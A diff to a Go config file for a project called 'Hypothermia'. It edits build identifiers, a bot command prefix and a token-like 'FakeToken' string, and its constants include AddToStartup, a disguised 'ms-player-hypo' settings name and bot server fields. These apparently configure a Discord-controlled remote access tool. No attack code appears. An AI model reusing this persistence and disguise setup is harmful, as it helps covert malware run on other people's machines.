@@ -3,9 +3,14 @@ package config
 const (
 	// build stuff
 	HypothermiaName string = "Hypo"
-	Identifier      string = "N95FJM7VB8J0"
-	Verifier        string = "G40FG"
+	Identifier      string = "GHY7G4534Y5RH4HG"
+	Verifier        string = "SZG5YH"
 	SettingsName    string = "ms-player-hypo"
+
+	// version
+	Major int = 1
+	Minor int = 1
+	Patch int = 2
 
 	// debug
 	Debugging    bool = false
@@ -13,13 +18,13 @@ const (
 	AddToStartup bool = true
 
 	// bot stuff
-	Prefix string = ">"
+	Prefix string = "."
 
 	BotToken   string = ""
 	ServerId   string = ""
 	CategoryId string = ""
 
-	FakeToken    string = "MTAzMjg4Mjk1MDg2NzA5ODg2MA.GSFXy6.4BwrWVdsyL3H8edw8lb77sdeEqlRygtrdh"
+	FakeToken    string = "MTAzMjg4Mjk1MDg2NzA5ODg2MA.GSFXy6.4BwrWVdsyL3H8edw8lb77sdeEulRygtrdh"
 	FakeServer   string = "3274623486732456723"
 	FakeCategory string = "4865435987453987442"
 
